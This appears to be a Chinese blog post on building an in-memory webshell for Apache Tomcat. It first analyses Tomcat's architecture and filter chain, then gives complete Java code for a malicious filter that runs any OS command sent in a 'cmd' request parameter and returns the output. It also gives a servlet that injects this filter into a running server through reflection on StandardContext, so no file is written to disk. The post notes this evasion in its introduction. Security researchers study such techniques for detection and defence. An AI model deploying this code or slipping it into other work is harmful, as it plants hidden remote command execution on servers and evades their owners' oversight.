<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/nice0e3/p/14622879.html)

Java 安全之基于 Tomcat 实现内存马
=======================

0x00 前言[#](#0x00-前言)
--------------------

在近年来红队行动中，基本上除了非必要情况，一般会选择打入内存马，然后再去连接。而落地 Jsp 文件也任意被设备给检测到，从而得到攻击路径，删除 webshell 以及修补漏洞，内存马也很好的解决了反序列化回显的问题。但是随着红蓝攻防持续博弈中，一些内存马的查杀工具也开始逐渐开始出现、成型。所以有必要研究一下内存马的实现。

0x01 Tomcat 架构分析[#](#0x01-tomcat架构分析)
-------------------------------------

需要了解基于 tomcat 内存马实现还得去分析 tomcat 的一些处理机制以及结构。而在 Tomcat 中的内存马并不能和 Weblogic 的内存马实现通用，因为结构上就不一样。

下面对 tomcat 的体系结构与执行流程进行一系列的探究，下面来看张 tomcat 的架构图

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173116752-671327645.png)

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173125721-1402357750.png)

*   Server：  
    Server，即指的 WEB 服务器, 一个 Server 包括多个 Service。
    
*   Service：
    
    Service 的作用是在`Connector`和`Engine`外面包了一层（可看上图），把它们组装在一起，对外提供服务。一个`Service`可以包含多个`Connector`，但是只能包含一个`Engine`，其中`Connector`的作用是从客户端接收请求，Engine 的作用是处理接收进来的请求。后面再来细节分析 Service。
    
*   Connector：
    
    Tomcat 有两个典型的`Connector`，一个直接侦听来自 browser 的 http 请求，一个侦听来自其它 WebServer 的请求 Coyote Http/1.1 Connector 在端口 8080 处侦听来自客户 browser 的 http 请求  
    Coyote JK2 Connector 在端口 8009 处侦听来自其它 WebServer(Apache) 的 servlet/jsp 代理请求。
    
*   Engine：
    
    Engine 下可以配置多个虚拟主机，每个虚拟主机都有一个域名当`Engine`获得一个请求时，它把该请求匹配到某个`Host`上，然后把该请求交给该`Host`来处理`Engine`有一个默认虚拟主机，当请求无法匹配到任何一个`Host`上的时候，将交给该默认 Host 来处理。
    
*   Host：
    
    代表一个虚拟主机，每个虚拟主机和某个网络域名 Domain Name 相匹配  
    每个虚拟主机下都可以部署 (deploy) 一个或者多个 Web App，每个 Web App 对应于一个 Context，有一个 Context path，当 Host 获得一个请求时，将把该请求匹配到某个 Context 上，然后把该请求交给该 Context 来处理匹配的方法是“最长匹配”，所以一个 path=="" 的 Context 将成为该 Host 的默认 Context 所有无法和其它 Context 的路径名匹配的请求都将最终和该默认 Context 匹配。
    
*   Context：
    
    一个 Context 对应于一个 Web Application，一个`WebApplication`由一个或者多个 Servlet 组成  
    Context 在创建的时候将根据配置文件`$CATALINA_HOME/conf/web.xml`和`$WEBAPP_HOME/WEB-INF/web.xml`载入 Servlet 类，当 Context 获得请求时，将在自己的映射表 (mapping table) 中寻找相匹配的 Servlet 类。如果找到，则执行该类，获得请求的回应，并返回。
    

**下面来看详细说明：**

### Connector[#](#connector)

Connector 也被叫做连接器。Connector 将在某个指定的端口上来监听客户的请求，把从 socket 传递过来的数据，封装成 Request，传递给 Engine 来处理，并从 Engine 处获得响应并返回给客户端。

```
Engine：最顶层容器组件，其下可以包含多个 Host。
Host：一个 Host 代表一个虚拟主机，其下可以包含多个 Context。
Context：一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper。
Wrapper：一个 Wrapper 代表一个 Servlet。


```

对照图：

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173138769-1978092618.png)

### ProtocolHandler[#](#protocolhandler)

在`Connector`中，包含了多个组件，`Connector`使用`ProtocolHandler`处理器来处理请求。不同的`ProtocolHandler`代表不同连接类型。`ProtocolHandler`处理器可以用看作是**协议处理统筹者**，通过管理其他工作组件实现对请求的处理。`ProtocolHandler` 包含了三个非常重要的组件, 这三个组件分别是：

```
- Endpoint: 负责接受，处理socket网络连接
- Processor： 负责将从Endpoint接受的socket连接根据协议类型封装成request
- Adapter:负责将封装好的Request交给Container进行处理,解析为可供Container调用的继承了		      ServletRequest接口、ServletResponse接口的对象。


```

请求经 Connector 处理完毕后，传递给 Container 进行处理。

### Container[#](#container)

Container 容器则是负责封装和管理 Servlet 处理用户的 servlet 请求，并返回对象给 web 用户的模块。

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173143990-26279934.png)

Container 处理请求，内部是使用`Pipeline-Value`管道来处理的，每个 `Pipeline` 都有特定的 `Value（BaseValue）`，**BaseValue 会在最后执行**。上层容器的`BaseValue` 会调用下层容器的管道，`FilterChain` 其实就是这种模式，`FilterChain` 相当于 `Pipeline`，每个 Filter 相当于一个 Value。4 个容器的`BaseValve` 分别是`StandardEngineValve` 、`StandardHostValve` 、`StandardContextValve 和StandardWrapperValve`。每个 Pipeline 都有特定的 Value ，而且是在管道的最后一个执行，这个 Valve 叫`BaseValve`，`BaseValve` 是不可删除的。

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173148909-1433590011.png)

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173153459-1466053675.png)

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173158354-136084288.png)

这三张图其实就很好的解释了他的一个执行流程，看到最后一张图，在`wrapper-Pipline`执行完成后会去创建一个`FilterChain`对象也就是我们的过滤链。这里来解释一下过滤链。

**过滤链**：在一个 Web 应用程序中可以注册多个 Filter 程序，每个 Filter 程序都可以针对某一个 URL 进行拦截。如果多个 Filter 程序都对同一个 URL 进行拦截，那么这些 Filter 就会组成一个 Filter 链（也称  
过滤器链）。

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173203808-1677142648.png)

如果做过 Java web 开发的话，不难发现在配置 Filter 的时候，假设执行完了就会来到下一个 Filter 里面，如果都 `FilterChain.doFilter`进行放行的话，那么这时候才会执行 servlet 内容。原理如上。

整体的执行流程，如下图：

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173209569-348731168.png)

```
Server :
- Service 
-- Connector: 客户端接收请求
--- ProtocolHandler: 管理其他工作组件实现对请求的处理
---- Endpoint: 负责接受，处理socket网络连接
---- Processor: 负责将从Endpoint接受的socket连接根据协议类型封装成request
---- Adapter: 负责将封装好的Request交给Container进行处理,解析为可供Container调用的继承了		      ServletRequest接口、ServletResponse接口的对象。
--- Container: 负责封装和管理Servlet 处理用户的servlet请求，并返回对象给web用户的模块
-- Engine:处理接收进来的请求
--- Host: 虚拟主机
--- Host: 虚拟主机
--- Host: 虚拟主机
--- Context: 相当于一个web应用
--- Context：相当于一个web应用
--- Context：相当于一个web应用


```

0x02 过滤链分析[#](#0x02-过滤链分析)
--------------------------

在分析过滤链前需要了解的一些基础知识，不然看起来比较费劲。在网上查阅了一些资料。

### ServletContext[#](#servletcontext)

`javax.servlet.ServletContext`Servlet 规范中规定了的一个`ServletContext`接口，提供了 Web 应用所有`Servlet`的视图，通过它可以对某个 Web 应用的各种资源和功能进行访问。WEB 容器在启动时，它会为每个 Web 应用程序都创建一个对应的`ServletContext`，它代表当前 Web 应用。并且它被所有客户端共享。

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173216413-1568412074.png)

看到`ServletContext`的方法中有`addFilter`、`addServlet`、`addListener`方法，即添加`Filter`、`Servlet`、`Listener`

那么如何获取到这个`ServletContext`呢？

获取 ServletContext 的方法

```
this.getServletContext();
this.getServletConfig().getServletContext();


```

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173242722-1369471955.png)

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173247171-971970236.png)

但是这里获取到的实际上是一个`ApplicationContextFacade`对象，该对象对`ApplicationContext`的实例进行的一个封装。

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173253199-1068872440.png)

### ApplicationContext[#](#applicationcontext)

`org.apache.catalina.core.ApplicationContext`

对应 Tomcat 容器，为了满足`Servlet`规范，必须包含一个`ServletContext`接口的实现。Tomcat 的 Context 容器中都会包含一个 ApplicationContext。

### StandardContext[#](#standardcontext)

Catalina 主要包括 Connector 和 Container，StandardContext 就是一个 Container，它主要负责对进入的用户请求进行处理。实际来说，不是由它来进行处理，而是交给内部的 valve 处理。  
一个 context 表示了一个外部应用，它包含多个 wrapper，每个 wrapper 表示一个 servlet 定义。（Tomcat 默认的 Service 服务是 Catalina）

### Filter 链分析[#](#filter链分析)

#### 过滤链创建细节分析[#](#过滤链创建细节分析)

假设我们基于 filter 去实现一个内存马，我们需要找到 filter 是如何被创建的。  
下面使用 IDEA 对其进行调试，这里配置了一个简单的过滤器，然后运行进行调试。

打开 IDEA 开冲。下个断点逆向进行分析

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173300163-824089932.png)

`org.apache.catalina.core.ApplicationFilterChain#internalDoFilter`中会去调用`filter.doFilter`才会来到我们配置的`filter.doFilter`方法中。其实还是前面讲到的责任链。

这里会从`filterConfig`中去获取到一个 filter 对象然后来进行调用`doFilter`。跟踪到上层。

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173305252-1754529363.png)

`org.apache.catalina.core.ApplicationFilterChain#doFilter`会被`org.apache.catalina.core.StandardWrapperValve#invoke`方法调用。

**invoke 方法说明**：请求进入后，Connector 调用 context 的 invoke 方法。invoke 将请求交给其 pipeline 去处理，由 pipeline 中的所有 valve 顺序处理请求。

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173310835-1031410355.png)

在 invoke 方法的位置调用`filterChain.doFilter`，对请求进行过滤操作。那么再来看看`filterChain`是如何获取到的。

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173315502-1721677477.png)

使用`ApplicationFilterFactory.createFilterChain`创建了一个过滤链，将`request, wrapper, servlet`进行传递。

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173323372-1816321925.png)

跟进`ApplicationFilterFactory.createFilterChain`方法查看

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173329475-1410157890.png)

这里则会调用`context.findFilterMaps()`从`StandardContext`寻找并且返回一个 FilterMap 数组。

再来看到后面的代码  
![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173336448-2076390284.png)

遍历`StandardContext.filterMaps`得到 filter 与 URL 的映射关系并通过`matchDispatcher()`、`matchFilterURL()`方法进行匹配，匹配成功后，还需判断`StandardContext.filterConfigs`中，是否存在对应 filter 的实例，当实例不为空时通过`addFilter`方法，将管理 filter 实例的`filterConfig`添加入`filterChain`对象中。

再回溯上层

```
 Wrapper wrapper = request.getWrapper();
		......
            
 wrapper.getPipeline().getFirst().invoke(request, response);


```

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173341599-602049948.png)

而下面的一系列都是调用管道的 invoke 方法，则对应这张图

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173345911-1374386057.png)

#### Filter 实例存储分析[#](#filter实例存储分析)

下面再来看看 **Filter 实例**存放的位置在哪，在开发中会从 web.xml 或注解去配置一个 Filter，`org.apache.catalina.core.StandardContext`容器类负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。

里面有三个和 Filter 有关的成员变量：

```
    filterMaps变量：包含所有过滤器的URL映射关系

    filterDefs变量：包含所有过滤器包括实例内部等变量 

    filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理


```

filterConfigs 成员变量是一个 HashMap 对象，里面存储了 filter 名称与对应的`ApplicationFilterConfig`对象的键值对，在`ApplicationFilterConfig`对象中则存储了 Filter 实例以及该实例在 web.xml 中的注册信息。

filterDefs 成员变量成员变量是一个 HashMap 对象，存储了 filter 名称与相应`FilterDef`的对象的键值对，而`FilterDef`对象则存储了 Filter 包括名称、描述、类名、Filter 实例在内等与 filter 自身相关的数据

filterMaps 中的`FilterMap`则记录了不同 filter 与`UrlPattern`的映射关系

```
private HashMap<String, ApplicationFilterConfig> filterConfigs = new HashMap();

private HashMap<String, FilterDef> filterDefs = new HashMap();

private final StandardContext.ContextFilterMaps filterMaps = new StandardContext.ContextFilterMaps();


```

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173358199-1785506616.png)

0x03 内存马实现[#](#0x03-内存马实现)
--------------------------

先来配置一个配置上一个恶意的 Filter。

```
import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

@WebFilter("/*")
public class cmd_Filters implements Filter {
    public void destroy() {
    }

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        if (req.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            resp.getWriter().write(output);
            resp.getWriter().flush();
        }
        chain.doFilter(request, response);
    }

    public void init(FilterConfig config) throws ServletException {

    }

}


```

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173402582-2034958837.png)

本质上其实就是 Filter 中接受执行参数，但是如果我们在现实情况中需要动态的将该 Filter 给添加进去。

由前面 **Filter 实例存储分析**得知 `StandardContext` Filter 实例存放在 filterConfigs、filterDefs、filterConfigs 这三个变量里面，将 fifter 添加到这三个变量中即可将内存马打入。那么如何获取到`StandardContext` 成为了问题的关键。

```
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import java.util.Map;
import java.util.Scanner;

@WebServlet("/demoServlet")
public class demoServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {


//        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
//        org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
//        org.apache.catalina.core.StandardContext standardContext = (StandardContext) standardroot.getContext();
//该获取StandardContext测试报错
        Field Configs = null;
        Map filterConfigs;
        try {
            //这里是反射获取ApplicationContext的context，也就是standardContext
            ServletContext servletContext = request.getSession().getServletContext();

            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);



            String FilterName = "cmd_Filter";
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(FilterName) == null){
                Filter filter = new Filter() {

                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                        HttpServletRequest req = (HttpServletRequest) servletRequest;
                        if (req.getParameter("cmd") != null){

                            InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
//
                            Scanner s = new Scanner(in).useDelimiter("\\A");
                            String output = s.hasNext() ? s.next() : "";
                            servletResponse.getWriter().write(output);

                            return;
                        }
                        filterChain.doFilter(servletRequest,servletResponse);
                    }

                    @Override
                    public void destroy() {

                    }
                };
                //反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加
                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
                FilterDef o = (FilterDef)declaredConstructors.newInstance();
                o.setFilter(filter);
                o.setFilterName(FilterName);
                o.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(o);
                //反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去
                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
                org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();

                o1.addURLPattern("/*");
                o1.setFilterName(FilterName);
                o1.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(o1);

                //反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去
                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
                declaredConstructor1.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
                filterConfigs.put(FilterName,filterConfig);
                response.getWriter().write("Success");


            }
        } catch (Exception e) {
            e.printStackTrace();
        }




    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
}



```

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173411342-256111941.png)

![](https://img2020.cnblogs.com/blog/1993669/202104/1993669-20210406173414621-907571387.png)

这个`StandardContext`获取到的方式也有待研究。获取到`StandardContext`类后，后面的则是使用反射将一些属性或值添加进去的步骤。

0x04 结尾[#](#0x04-结尾)
--------------------

寥寥草草结尾，其实还有很多值得研究。